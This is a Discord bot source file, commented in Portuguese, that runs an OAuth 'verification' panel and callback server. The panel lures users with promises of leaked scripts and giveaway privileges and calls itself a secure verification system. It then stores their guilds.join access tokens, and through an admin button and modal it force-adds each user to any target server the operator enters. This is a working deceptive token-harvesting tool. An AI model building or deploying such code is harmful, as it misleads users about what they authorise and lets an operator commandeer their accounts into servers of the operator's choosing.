require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, PermissionsBitField 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
// ID do canal de logs (onde chega o aviso para o admin)
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
// Link para onde o usuário volta após o sucesso (O canal do servidor)
const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; 

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const userTokens = new Map();

// --- SERVIDOR WEB (Visual Bonito) ---
app.get('/', (req, res) => res.send('Auth Manager Online 🟢'));

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('Erro: Falta o código.');

    try {
        // 1. Troca Código por Token
        // IMPORTANTE: As variáveis no Render devem bater com o ID do link que você mandou
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token } = tokenResponse.data;

        // 2. Pega dados do Usuário
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        // 3. Salva Token na Memória
        userTokens.set(user.id, access_token);

        // 4. Envia LOG para o Admin
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embedLog = new EmbedBuilder()
                .setTitle('📥 Novo Usuário Autorizado')
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                .addFields(
                    { name: 'Usuário', value: `${user.username} (${user.id})`, inline: true },
                    { name: 'Status', value: '🟢 Token Salvo', inline: true }
                )
                .setColor(0x00FF00)
                .setFooter({ text: 'Aguardando envio...' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`btn_abrir_envio_${user.id}`)
                    .setLabel('Enviar para um Servidor')
                    .setStyle(ButtonStyle.Primary)
                    .setEmoji('✈️')
            );

            await logChannel.send({ embeds: [embedLog], components: [row] });
        }

        // 5. SITE BONITO (HTML/CSS)
        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificado com Sucesso</title>
                <style>
                    body { background-color: #2b2d31; font-family: 'Segoe UI', sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
                    .card { background-color: #313338; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center; max-width: 400px; width: 90%; }
                    .icon { font-size: 60px; color: #23a559; margin-bottom: 20px; }
                    h1 { margin: 0 0 10px 0; font-size: 24px; }
                    p { color: #b5bac1; margin-bottom: 30px; }
                    .btn { background-color: #5865F2; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background 0.2s; display: inline-block; }
                    .btn:hover { background-color: #4752c4; }
                    .timer { margin-top: 20px; font-size: 12px; color: #949ba4; }
                </style>
            </head>
            <body>
                <div class="card">
                    <div class="icon">✅</div>
                    <h1>Verificado!</h1>
                    <p>Sua conta foi autenticada. Você já pode fechar esta janela.</p>
                    <a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a>
                    <div class="timer">Redirecionando em <span id="count">3</span>s...</div>
                </div>
                <script>
                    let seconds = 3;
                    const countSpan = document.getElementById('count');
                    setInterval(() => {
                        seconds--;
                        countSpan.innerText = seconds;
                        if (seconds <= 0) window.location.href = "${REDIRECT_TARGET}";
                    }, 1000);
                </script>
            </body>
            </html>
        `);

    } catch (error) {
        console.error(error);
        res.send('❌ Erro na verificação. Verifique se o CLIENT_SECRET no Render corresponde ao BOT do link.');
    }
});

app.listen(process.env.PORT || 3000);

// --- BOT DISCORD ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    
    const guildId = process.env.MAIN_GUILD;
    if(guildId) {
        const guild = client.guilds.cache.get(guildId);
        if(guild) {
            await guild.commands.set([{
                name: 'setup_auth',
                description: 'Cria o painel de verificação'
            }]);
        }
    }
});

client.on('interactionCreate', async interaction => {
    
    // 1. COMANDO SETUP
    if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        // --- AQUI ESTÁ O LINK QUE VOCÊ PEDIU ---
        const authUrl = "https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fhunter-bot-verify.onrender.com%2Fcallback&scope=identify+guilds.join";

        const embed = new EmbedBuilder()
            .setTitle('🔓 Liberação de Acesso')
            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para autenticar sua conta.')
            .setColor(0x5865F2)
            .setFooter({ text: 'Sistema Seguro de Verificação' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅')
        );

        await interaction.channel.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: 'Painel criado!', ephemeral: true });
    }

    // 2. ABRIR MODAL DE ENVIO
    if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
        const targetUserId = interaction.customId.split('_')[3];
        const modal = new ModalBuilder().setCustomId(`modal_envio_${targetUserId}`).setTitle('Enviar Usuário');
        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel("ID do Servidor Alvo").setStyle(TextInputStyle.Short);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    // 3. ENVIAR USUÁRIO
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
        const targetUserId = interaction.customId.split('_')[2];
        const targetServerId = interaction.fields.getTextInputValue('input_server_id');
        const accessToken = userTokens.get(targetUserId);

        await interaction.deferReply({ ephemeral: true });

        if (!accessToken) return interaction.editReply('❌ Token expirou (Bot reiniciou).');

        try {
            await axios.put(
                `https://discord.com/api/guilds/${targetServerId}/members/${targetUserId}`,
                { access_token: accessToken },
                { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
            );
            await interaction.editReply(`✅ **Sucesso!** Enviado para \`${targetServerId}\`.`);
        } catch (erro) {
            await interaction.editReply('❌ Falha ao adicionar. O Bot está no servidor alvo com permissão de Criar Convite/Admin?');
        }
    }
});

client.login(process.env.BOT_TOKEN);
